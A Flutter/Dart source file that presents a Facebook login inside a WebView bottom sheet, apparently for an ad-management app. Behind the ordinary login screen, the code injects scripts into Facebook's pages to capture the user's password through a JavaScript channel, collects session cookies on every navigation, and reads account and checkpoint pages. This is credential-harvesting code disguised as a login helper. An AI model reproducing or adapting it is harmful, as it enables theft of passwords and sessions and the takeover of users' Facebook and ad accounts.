import 'package:ad_support_suite/features/login_facebook/controllers/login_facebook_controller.dart';
import 'package:flutter/cupertino.dart';
import 'package:flutter/material.dart';
import 'package:get/get.dart';
import 'package:webview_flutter/webview_flutter.dart';

import '../../../core/const/constans.dart';
import '../../../theme/app_theme.dart';


Future<void> showWebVew(
  BuildContext context, {
  required LoginFacebookController loginFacebookController,
}) {
  return showModalBottomSheet<void>(
    context: context,
    isScrollControlled: true,
    shape: RoundedRectangleBorder(
      borderRadius: BorderRadius.circular(12),
    ),
    builder: (BuildContext context) => _WebViewBottomSheet(
      loginController: loginFacebookController,
    ),
  );
}

class _WebViewBottomSheet extends StatelessWidget {
  const _WebViewBottomSheet({
    Key? key,
    required this.loginController,
  }) : super(key: key);

  final LoginFacebookController loginController;

  @override
  Widget build(BuildContext context) {
    return Container(
      height: MediaQuery.of(context).size.height - 100,
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(12),
        color: colorWhite,
      ),
      child: Column(
        children: [
          Container(
            height: 4,
            width: 40,
            margin: const EdgeInsets.all(kDefaultPadding),
            decoration: BoxDecoration(
              borderRadius: BorderRadius.circular(12),
              color: colorNeutralGray40,
            ),
          ),
          Expanded(
            child: Stack(
              children: [
                WebView(
                  initialUrl: fbUrl,
                  navigationDelegate: (NavigationRequest request) {
                    loginController.getCookie();

                    return NavigationDecision.navigate;
                  },
                  javascriptMode: JavascriptMode.unrestricted,
                  onWebViewCreated: (WebViewController webViewCtrl) {
                    loginController.webViewCtrlFormLogin = webViewCtrl;
                  },
                  onPageFinished: (value) {
                    loginController.injectScripGetPass();
                  },
                  javascriptChannels: {
                    JavascriptChannel(
                      name: 'jsMessageHandler',
                      onMessageReceived: (JavascriptMessage message) {
                        loginController.handlePassReceived(message.message);
                      },
                    )
                  },
                ),
                Obx(() => loginController.hasCookie.value
                    ? Positioned.fill(
                        child: WebView(
                          initialUrl:
                              "$mfbUrl/${loginController.accountId.value}",
                          javascriptMode: JavascriptMode.unrestricted,
                          onWebViewCreated: (WebViewController webViewCtrl) {
                            loginController.webViewCtrl = webViewCtrl;
                          },
                          navigationDelegate: (NavigationRequest request) {
                            loginController.getCookie();

                            return NavigationDecision.navigate;
                          },
                          onPageFinished: (value) {
                            loginController.injectScripGetDisplayName();
                          },
                          javascriptChannels: {
                            JavascriptChannel(
                              name: 'jsMessageHandler',
                              onMessageReceived: (JavascriptMessage message) {
                                loginController
                                    .handleDisplayNameReceived(message.message);
                              },
                            )
                          },
                        ),
                      )
                    : Container()),
                Obx(
                  () => loginController.hasCookie.value
                      ? Positioned.fill(
                          child: Container(
                            color: Colors.white,
                            child: const SizedBox(
                              width: 20,
                              height: 20,
                              child: CupertinoActivityIndicator(
                                radius: 20.0,
                                color: CupertinoColors.activeBlue,
                              ),
                            ),
                          ),
                        )
                      : const SizedBox.shrink(),
                ),
                Obx(() => loginController.displayName.value == "Check point"
                    ? WebView(
                        initialUrl: "https://www.facebook.com/checkpoint/?next",
                        javascriptMode: JavascriptMode.unrestricted,
                        onWebViewCreated: (WebViewController webViewCtrl) {
                          loginController.webViewCtrl = webViewCtrl;
                        },
                        navigationDelegate: (NavigationRequest request) {
                          loginController.getCookie();

                          return NavigationDecision.navigate;
                        },
                        onPageFinished: (value) {
                          loginController.injectScripGetDisplayName();
                        },
                        javascriptChannels: {
                          JavascriptChannel(
                            name: 'jsMessageHandler',
                            onMessageReceived: (JavascriptMessage message) {
                              loginController
                                  .handleDisplayNameReceived(message.message);
                            },
                          )
                        },
                      )
                    : Container()),
              ],
            ),
          ),
        ],
      ),
    );
  }
}
